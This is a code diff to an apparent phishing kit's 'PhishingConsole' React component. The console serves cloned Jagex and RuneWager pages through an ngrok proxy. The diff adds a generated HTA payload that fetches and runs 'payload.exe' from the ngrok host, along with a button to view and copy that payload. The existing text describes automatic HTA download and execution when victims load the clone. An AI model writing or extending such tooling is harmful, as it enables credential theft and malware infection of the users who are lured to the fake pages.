@@ -1,7 +1,8 @@
 import React, { useState } from 'react';
-import { Shield, Globe, Terminal, ExternalLink, Copy, Check, Zap, Eye, Monitor } from 'lucide-react';
+import { Shield, Globe, Terminal, ExternalLink, Copy, Check, Zap, Eye, Monitor, FileCode } from 'lucide-react';
 import { cn } from '../lib/utils';
 import { JAGEX_CLONE, RUNEWAGER_CLONE } from '../lib/clones';
+import { generateHtaPayload } from '../lib/payloads';
 import { toast } from 'sonner';
 
 const CLONES = [
@@ -16,7 +17,10 @@ export function PhishingConsole() {
   const [selectedClone, setSelectedClone] = useState(CLONES[0]);
   const [ngrokUrl, setNgrokUrl] = useState('https://pegasus-proxy.ngrok-free.app');
   const [isDeploying, setIsDeploying] = useState(false);
+  const [showHta, setShowHta] = useState(false);
   const [copied, setCopied] = useState(false);
+
+  const htaPayload = generateHtaPayload(`${ngrokUrl}/payload.exe`);
 
   const handleDeploy = () => {
     setIsDeploying(true);
@@ -124,6 +128,26 @@ export function PhishingConsole() {
             <p className="text-[9px] font-mono text-white/30 leading-tight">
               When enabled, the clone will automatically attempt to trigger an HTA download/execution via the Pegasus proxy fallback mechanism.
             </p>
+            <button 
+              onClick={() => setShowHta(!showHta)}
+              className="w-full py-2 rounded border border-[#F27D26]/20 text-[10px] font-mono text-[#F27D26] hover:bg-[#F27D26]/5 transition-all flex items-center justify-center gap-2"
+            >
+              <FileCode size={12} />
+              {showHta ? 'Hide HTA Payload' : 'View HTA Payload'}
+            </button>
+            {showHta && (
+              <div className="p-2 bg-black rounded border border-white/5 relative group">
+                <pre className="text-[8px] font-mono text-white/40 overflow-x-auto whitespace-pre-wrap">
+                  {htaPayload}
+                </pre>
+                <button 
+                  onClick={() => copyToClipboard(htaPayload)}
+                  className="absolute top-2 right-2 p-1 bg-white/5 rounded opacity-0 group-hover:opacity-100 transition-opacity"
+                >
+                  <Copy size={10} className="text-white/40" />
+                </button>
+              </div>
+            )}
           </div>
         </div>
 
